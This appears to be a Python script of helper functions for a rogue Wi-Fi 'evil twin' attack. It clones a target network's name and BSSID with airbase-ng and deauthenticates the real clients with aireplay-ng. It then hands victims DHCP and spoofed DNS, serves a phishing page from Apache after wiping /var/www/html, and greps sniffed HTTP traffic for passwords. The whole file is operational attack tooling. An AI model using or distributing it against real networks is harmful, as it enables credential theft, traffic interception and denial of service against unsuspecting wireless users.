import os
import subprocess as sb
import sys
import time

pwd = os.getcwd()

def dump(interface):
    os.system("xterm -e airodump-ng {0}".format(interface))

def createfake(interface, essid, bssid, channel):
    os.system("xterm -e airbase-ng -e \"{0}\" -c {1} -a {2} -P {3} &".format(essid, channel, bssid, interface))
    time.sleep(10)
    os.system("ifconfig at0 up")
    os.system("ifconfig at0 up 192.168.2.1 netmask 255.255.255.0")
    os.system("route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1")

def at0up(interface):
    os.system("ifconfig {0} up 192.168.2.1 netmask 255.255.255.0".format(interface))
    os.system("route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1")

def dnsmasqconfig():
    os.system("killall dnsmasq dhcpd isc-dhcp-server")
    with open("dnsmasq.conf", "w") as conf:
        conf.write("""interface=at0 #Fake AP Interface name
dhcp-range=192.168.2.2,192.168.2.30,255.255.255.0,12h
dhcp-option=3,192.168.2.1
dhcp-option=6,192.168.2.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1""")
        conf.close()

def dnsmasqstart():
    os.system("xterm -e dnsmasq -C dnsmasq.conf -d &")



def iptables(interfaceon, interfacemon):
    os.system("iptables --flush && iptables --table nat --flush")
    os.system("iptables --delete-chain && iptables --table nat --delete-chain")
    os.system("iptables --table nat --append POSTROUTING --out-interface {0} -j MASQUERADE".format(interfaceon))
    os.system("iptables --append FORWARD --in-interface {0} -j ACCEPT".format(interfacemon))


def ipforward_on():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as ip:
        ip.write("1")
        ip.close()

def ipforward_off():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as ip:
        ip.write("0")
        ip.close()

def dnsspoof(interface):
    os.system("xterm -e dnsspoof -i {0} &".format(interface))

def apache2(path, code=None):
    os.system("rm -rf /var/www/html/*")
    os.system("service apache2 start")

    if not code == None:
        with open(pwd+"/pages/device/html/index.html", "w") as page:
            page.write(code)
            page.close()
        os.system("cp -r pages/device/html/* /var/www/html/")

    else:
        os.system("unzip {0} -d /var/www/html/".format(path))



def tcpflow():
    os.system("xterm -e tcpflow -i any -C -g port 80 | grep -i \"password\"")


def Deauth(bssid, interface):
    os.system("xterm -e aireplay-ng -0 0 -a {0} {1} &".format(bssid, interface))
